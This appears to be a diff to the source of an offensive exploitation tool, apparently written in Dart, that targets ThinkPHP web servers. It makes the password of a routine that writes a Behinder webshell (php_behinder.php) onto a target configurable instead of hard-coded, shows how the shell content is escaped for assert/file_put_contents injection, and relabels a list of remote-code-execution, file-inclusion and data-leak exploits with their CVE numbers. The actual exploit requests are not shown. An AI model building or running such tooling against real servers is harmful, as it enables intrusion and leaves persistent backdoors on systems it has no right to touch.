@@ -626,10 +626,10 @@ class ThinkphpExpService {
 
   /// GetShell（写入 php_behinder.php，使用内置冰蝎马，密码 mAtrix_911）
   /// [shellContent] 为 assets/defaults/payloads/php_behinder.php 的内容
-  Future<String?> getShell(ThinkphpVulnType type, String shellContent) async {
+  Future<String?> getShell(ThinkphpVulnType type, String shellContent, {String password = 'mAtrix_911'}) async {
     final mod = await _getModule();
     const shellFile = 'php_behinder.php';
-    const shellPass = 'mAtrix_911';
+    final shellPass = password;
 
     // 用于 assert/file_put_contents 的 PHP 字符串转义：' -> \', \ -> \\
     final shellForAssert = shellContent.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
@@ -810,42 +810,42 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
   String get label {
     switch (this) {
       case ThinkphpVulnType.tp50:
-        return 'ThinkPHP 5.0 RCE';
+        return 'ThinkPHP CVE-2018-20062 · 5.0 invokefunction RCE';
       case ThinkphpVulnType.tp5010:
-        return 'ThinkPHP 5.0.10 RCE';
+        return 'ThinkPHP CVE-2018-20062 · 5.0.10 assert RCE';
       case ThinkphpVulnType.tp5022_5129:
-        return 'ThinkPHP 5.0.22/5.1.29 RCE';
+        return 'ThinkPHP CVE-2018-20062 · 5.0.22/5.1.29 invokefunction RCE';
       case ThinkphpVulnType.tp5023:
-        return 'ThinkPHP 5.0.23 RCE';
+        return 'ThinkPHP CVE-2019-9082 · 5.0.23 captcha RCE';
       case ThinkphpVulnType.tp5023Debug:
-        return 'ThinkPHP 5.0.23 Debug RCE';
+        return 'ThinkPHP CVE-2019-9082 · 5.0.23 Debug RCE';
       case ThinkphpVulnType.tp5024_5130:
-        return 'ThinkPHP 5.0.24-5.1.30 RCE';
+        return 'ThinkPHP CVE-2018-20062 · 5.0.24-5.1.30 template/write RCE';
       case ThinkphpVulnType.tp5ViewDisplay:
-        return 'ThinkPHP 5 View/display RCE';
+        return 'ThinkPHP CVE-2018-20062 · 5.x View/display RCE';
       case ThinkphpVulnType.tp5MethodFilter:
-        return 'ThinkPHP 5.x _method=filter RCE';
+        return 'ThinkPHP CVE-2019-9082 · 5.x _method=filter RCE';
       case ThinkphpVulnType.tp5FileInclude:
-        return 'ThinkPHP 5.x Lang/load 文件包含';
+        return 'ThinkPHP CNVD-2022-86535 · 5.x/6.x Lang/load LFI';
       case ThinkphpVulnType.tp5ConfigGet:
         // 部分 Zentao 18.x 复用该配置接口，结果常出现在禅道环境中
-        return 'ThinkPHP 5.0.22 config 泄露（Zentao 18.x 组件常见）';
+        return 'ThinkPHP 5.0.22 · config 泄露（Zentao 18.x 组件常见）';
       case ThinkphpVulnType.tp5Db:
-        return 'ThinkPHP 5.x 数据库信息泄露';
+        return 'ThinkPHP 5.x · 数据库信息泄露';
       case ThinkphpVulnType.tp5Log:
-        return 'ThinkPHP 5.x 日志泄露';
+        return 'ThinkPHP 5.x · 日志泄露';
       case ThinkphpVulnType.tp3:
-        return 'ThinkPHP 3.x RCE';
+        return 'ThinkPHP 3.x · RCE';
       case ThinkphpVulnType.tp3Module:
-        return 'ThinkPHP 3.x Module RCE';
+        return 'ThinkPHP 3.x · Module RCE';
       case ThinkphpVulnType.tp3ModuleTypo:
-        return 'ThinkPHP 3.x module/aciton RCE';
+        return 'ThinkPHP 3.x · module/action RCE';
       case ThinkphpVulnType.tp3Log:
-        return 'ThinkPHP 3.x 日志泄露';
+        return 'ThinkPHP 3.x · 日志泄露';
       case ThinkphpVulnType.tp3LogRce:
-        return 'ThinkPHP 3.x Log RCE';
+        return 'ThinkPHP 3.x · Log RCE';
       case ThinkphpVulnType.tp6Log:
-        return 'ThinkPHP 6.x 日志泄露';
+        return 'ThinkPHP 6.x · 日志泄露';
     }
   }
 
